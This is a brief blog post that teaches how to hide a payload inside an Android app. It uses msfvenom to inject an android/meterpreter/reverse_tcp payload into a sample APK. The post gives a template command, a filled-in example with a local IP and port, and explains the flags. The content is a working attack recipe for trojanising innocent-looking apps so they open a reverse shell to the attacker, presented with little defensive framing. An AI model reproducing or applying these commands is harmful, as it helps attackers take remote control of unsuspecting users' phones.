---
layout: post
title: "Blog 11: Injecting Payloads into APK's"
---

One way that an attacker can gain access into another person's system is by injecting a payload into an otherwise innocent looking file. Unfortunately, mobile phones are in no way immune to such nefarious acts. More specifically, Android phones are much more vulnerable to issues like this considering that their app store isn't nearly as well regulated as the Apple App Store.

The process is fairly simple:
- Designate the type of payload (in this case, we are using a reverse TCP shell for android)
- Set a LocalHost IP (your IP, or the IP you plan to use for a loopback connection)
- Set the LocalHost port you want the connection to listen in on

You will be using the MetaSploit Framework for this example, which comes stock with Kali distro. Once you have Kali up and running, get any sample APK file, and use the following format to inject a payload and create a new APK as a result:

	$ msfvenom -x [PATH TO SAMPLE APK] -p android/meterpreter/reverse_tcp LHOST=[LOCAL IP ADDRESS] LPORT=[LOCAL PORT] -o [PATH/NAME FOR NEW APK]
	
To better visualize it, here's an actual sample command:

	$ msfvenom -x myoriginalapk.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=8888 -o /home/david/Desktop/mynewapk.apk
	
The flags explained:

- x = original file being used
- p = type of payload
- o = path to new apk

Now that we have our new APK set up, we need to go through a few more steps to be able to get any type of functionality. We can go over that it later posts, but this will get your started.

